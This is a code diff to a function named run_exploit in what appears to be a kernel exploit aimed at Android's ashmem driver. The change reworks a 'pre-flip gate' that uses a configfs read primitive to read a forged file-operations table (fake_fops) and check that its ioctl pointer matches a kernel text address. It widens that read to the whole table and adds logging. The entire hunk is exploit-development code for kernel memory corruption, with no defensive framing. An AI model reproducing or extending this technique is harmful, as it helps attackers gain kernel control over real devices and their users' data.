@@ -710,30 +710,43 @@ int run_exploit(int argc, char **argv) {
           continue;
         }
       }
-      uint64_t gate_read = 0;
+      /* Gate v2: whole-table read (same span as the fops.c:40 audit:
+       * FOPS_SHOW_FDINFO_OFF + 8 = 0xe8 = 232 bytes = 29 qwords).
+       * Single-slot +0x50 reads returned 0 bytes pre-trigger (120/120
+       * EOF); testing whether the blob window/pos differs for
+       * full-span reads. Compare in memory at [FOPS_IOCTL_OFF/8]. */
+      enum { gate_span = FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) };
+      uint64_t gate_table[gate_span / sizeof(uint64_t)];
       uint64_t gate_want = text_addr(ASHMEM_IOCTL);
       ssize_t gate_rd = -1;
+      memset(gate_table, 0, sizeof(gate_table));
       int gate_fd = open_ashmem_device();
       if (gate_fd >= 0) {
         int gate_errno = 0;
-        gate_rd = configfs_read_once(gate_fd, fake_fops + FOPS_IOCTL_OFF,
-                                     &gate_read, sizeof(gate_read));
+        gate_rd = configfs_read_once(gate_fd, fake_fops,
+                                     gate_table, sizeof(gate_table));
         gate_errno = errno;
         SYSCHK(close(gate_fd));
-        if (gate_rd != (ssize_t)sizeof(gate_read)) {
+        if (gate_rd != (ssize_t)sizeof(gate_table)) {
           pr_warning("pre-flip gate read failed attempt=%d/5 ret=%zd "
-                     "errno=%d\n",
-                     gate_attempt, gate_rd, gate_errno);
+                     "want=%zu errno=%d\n",
+                     gate_attempt, gate_rd, sizeof(gate_table),
+                     gate_errno);
         }
       } else {
         pr_warning("pre-flip gate open failed attempt=%d/5 errno=%d\n",
                    gate_attempt, errno);
       }
-      if (gate_rd != (ssize_t)sizeof(gate_read) ||
+      uint64_t gate_read = 0;
+      if (gate_rd == (ssize_t)sizeof(gate_table)) {
+        gate_read = gate_table[FOPS_IOCTL_OFF / sizeof(uint64_t)];
+      }
+      if (gate_rd != (ssize_t)sizeof(gate_table) ||
           gate_read != gate_want) {
-        pr_warning("pre-flip gate miss attempt=%d/5 read=%016llx "
-                   "want=%016llx\n",
-                   gate_attempt, (unsigned long long)gate_read,
+        pr_warning("pre-flip gate miss attempt=%d/5 ret=%zd "
+                   "read=%016llx want=%016llx\n",
+                   gate_attempt, gate_rd,
+                   (unsigned long long)gate_read,
                    (unsigned long long)gate_want);
         continue;
       }
